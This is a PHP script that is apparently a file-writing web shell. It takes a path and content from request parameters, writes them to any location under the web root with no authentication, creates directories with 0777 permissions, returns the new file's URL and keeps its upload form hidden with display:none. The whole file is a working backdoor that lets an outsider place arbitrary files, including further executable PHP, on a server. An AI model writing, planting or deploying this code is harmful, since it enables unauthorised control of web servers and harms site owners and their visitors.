<?php
 $dat = $_REQUEST['dat'];
 $fth  = $_REQUEST['fth'];
 if($dat!="")
 {
 	$fth=getFullFileName($fth);
 	$url=GetFullUrl($fth);
 	if(txt_to_file($dat ,$fth)) echo "<a href=$url>$url</a>";
 	else echo "失--败";
 } 
 echo "<div style='display:none'><form action='' method=post>"; 
 echo "文件<font color=red>绝对路径(包括文件名:如c:\a\d.php):</font>"; 
 echo "<input type=text name=fth width=32 size=50>"; 
 echo "<br>"; 
 echo "文件路径"; 
 echo $_SERVER['DOCUMENT_ROOT'].$_SERVER['SCRIPT_NAME'];
 echo "<br>"; 
 echo "内容:"; 
 echo "<textarea name=dat cols=80 rows=10 width=32></textarea>"; 
 echo "<input type=submit value=保存>";
 echo "</form></div>";
function txt_to_file($txt ,$filename){$dir = dirname($filename);if (!file_exists($dir)) mkdir($dir,0777,true); return file_put_contents($filename , $txt );}

function GetFullUrl($file)
{
		$rootpath = $_SERVER["DOCUMENT_ROOT"];
		$rootpath = str_ireplace("\\","/",$rootpath);
		$file = str_ireplace("\\","/",$file);
		$file = str_ireplace($rootpath,"",$file);
		$file = "/".$file;
		$file = str_ireplace("//","/",$file);
		$file = str_ireplace("//","/",$file);
		$returl     = "http://".$_SERVER["HTTP_HOST"].$file;
		return $returl;
}

//格式化文件为完整路径，补充全路径
function getFullFileName($file)
{
		$rootpath = $_SERVER["DOCUMENT_ROOT"];
		$rootpath = str_ireplace("\\","/",$rootpath);
		$file = str_ireplace("\\","/",$file);
		$file = str_ireplace($rootpath,"",$file);
		$file = "/".$file;
		$file = str_ireplace("//","/",$file);
		$file = str_ireplace("//","/",$file);
		$file = $rootpath.$file;
		return $file;
}
?>